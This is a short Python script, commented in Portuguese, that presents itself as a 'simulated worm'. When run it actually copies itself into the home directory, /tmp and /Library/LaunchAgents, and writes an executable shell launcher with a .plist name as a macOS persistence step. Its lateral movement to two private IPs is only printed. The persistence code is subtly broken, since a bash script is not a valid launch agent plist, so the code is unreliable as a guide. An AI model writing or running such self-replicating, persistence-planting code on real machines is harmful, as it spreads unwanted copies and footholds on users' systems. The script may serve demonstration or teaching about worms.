import os
import shutil
import sys
import subprocess
from pathlib import Path

# Nome do WORM simulado
WORM_NAME = "simulated_worm.py"
# Diretórios para replicação (Simulação)
TARGET_DIRECTORIES = [
    str(Path.home()),                     # Diretório home do usuário
    "/tmp",                               # Diretório temporário
    "/Library/LaunchAgents"               # Diretório de persistência (macOS)
]

# Função para replicar o WORM
def replicate():
    worm_path = os.path.abspath(sys.argv[0])
    print(f"Replicando WORM de {worm_path}...")
    
    for directory in TARGET_DIRECTORIES:
        target_path = os.path.join(directory, WORM_NAME)
        try:
            shutil.copy(worm_path, target_path)
            print(f"WORM replicado para: {target_path}")
        except PermissionError:
            print(f"Permissão negada para replicar em: {directory}")
        except Exception as e:
            print(f"Erro ao replicar em {directory}: {e}")

# Função para simular persistência (macOS)
def create_persistence():
    persistence_script = f"""
    #!/bin/bash
    python3 {os.path.join(Path.home(), WORM_NAME)}
    """
    persistence_path = os.path.expanduser("~/Library/LaunchAgents/com.simulated.worm.plist")

    with open(persistence_path, "w") as f:
        f.write(persistence_script)

    subprocess.call(["chmod", "+x", persistence_path])
    print(f"Persistência criada em: {persistence_path}")

# Simulação de movimento lateral (Apenas demonstrativo)
def simulate_lateral_movement():
    connected_devices = ["192.168.1.10", "192.168.1.11"]  # IPs fictícios
    for ip in connected_devices:
        print(f"Simulando movimento lateral para {ip}...")
        # Aqui, em um worm real, haveria uma tentativa de replicação no dispositivo remoto
        # Mas estamos apenas simulando.
        print(f"WORM não realmente replicado em {ip}.")

# Executar funções simuladas
if __name__ == "__main__":
    print("Iniciando WORM Simulado...")
    replicate()
    create_persistence()
    simulate_lateral_movement()
    print("Simulação do WORM concluída.")
